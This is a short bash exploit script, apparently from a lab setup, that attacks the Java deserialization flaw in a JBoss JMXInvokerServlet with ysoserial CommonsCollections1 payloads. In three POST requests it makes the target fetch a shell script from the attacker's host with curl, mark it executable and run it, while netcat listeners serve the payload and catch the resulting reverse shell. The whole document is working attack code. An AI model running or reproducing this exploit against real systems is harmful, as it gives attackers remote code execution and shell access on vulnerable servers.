#!/bin/bash
#
# http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
#

set -o monitor

YSO="ysoserial-0.0.2-all.jar"
PAYLOAD="reverse_shell.sh"
HTTP_HEADER="Content-type: application/x-java-serialized-object"
TARGET_URL="http://demo1:8080/invoker/JMXInvokerServlet"
LHOST="<%= @kali_ip %>"
LPORT="8080"

pkill nc

echo "[*] Generating serialized requests"
java -jar $YSO CommonsCollections1 "curl -s -o /tmp/payload.sh ${LHOST}:${LPORT}" > req1.ser
java -jar $YSO CommonsCollections1 "chmod +x /tmp/payload.sh" > req2.ser
java -jar $YSO CommonsCollections1 "/tmp/payload.sh" > req3.ser

echo "[*] transferring payload"
nc -q 3 -lvp 8080 < $PAYLOAD > /dev/null 2>&1 &
curl -s -o /dev/null -X POST --data-binary @req1.ser --header "$HTTP_HEADER" $TARGET_URL
curl -s -o /dev/null -X POST --data-binary @req2.ser --header "$HTTP_HEADER" $TARGET_URL

echo "[*] starting local listener"
nc -w 10 -lvp 8080 &

echo "[*] launching remote shell..."
echo ""
curl -s -o /dev/null -X POST --data-binary @req3.ser --header "$HTTP_HEADER" $TARGET_URL
fg %2
